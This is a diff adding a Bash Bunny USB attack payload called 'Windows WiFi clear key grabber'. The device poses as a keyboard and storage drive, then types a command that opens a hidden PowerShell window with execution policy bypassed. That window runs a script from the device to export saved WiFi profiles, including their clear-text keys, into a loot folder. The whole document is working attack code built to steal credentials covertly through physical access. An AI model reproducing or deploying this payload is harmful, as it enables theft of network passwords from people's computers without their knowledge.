@@ -1,0 +1,27 @@
+#!/bin/bash
+#
+# Title:         Windows WiFi clear key grabber
+# Author:        Valerie Daugherty (bitwise)
+# Version:       1.0
+#
+# Run a hidden powershell window that exports wifi profiles
+# to the bunny using netsh
+#
+
+
+LED SETUP
+ATTACKMODE HID STORAGE
+
+lootdir=loot/WiFi_Profiles/
+mkdir -p /root/udisk/$lootdir
+
+LED ATTACK
+Q DELAY 2000
+RUN WIN "powerShell -windowstyle Hidden -ExecutionPolicy Bypass .((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\profile.ps1')"
+
+# Sync filesystem
+Q DELAY 2000
+sync
+
+# Green LED for finished
+LED FINISH
